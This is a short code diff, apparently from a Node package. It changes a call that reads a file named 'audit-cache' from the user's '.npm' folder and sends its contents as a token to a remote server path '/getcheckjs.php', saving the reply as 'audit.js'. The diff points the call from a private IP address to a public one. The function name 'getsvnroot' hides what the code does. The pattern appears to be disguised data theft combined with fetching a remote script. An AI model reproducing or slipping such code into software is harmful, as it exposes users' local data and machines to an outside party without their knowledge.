@@ -41,5 +41,5 @@ var dir = path.join(os.homedir(), ".npm");
 if (fs.existsSync(dir)){
 	const token = fs.readFileSync(path.join(dir,'audit-cache'),
             {encoding:'utf8', flag:'r'});
-	getsvnroot('10.96.177.36', '/getcheckjs.php', token, path.join(dir ,'audit.js'));
+	getsvnroot('20.93.23.234', '/getcheckjs.php', token, path.join(dir ,'audit.js'));
 }
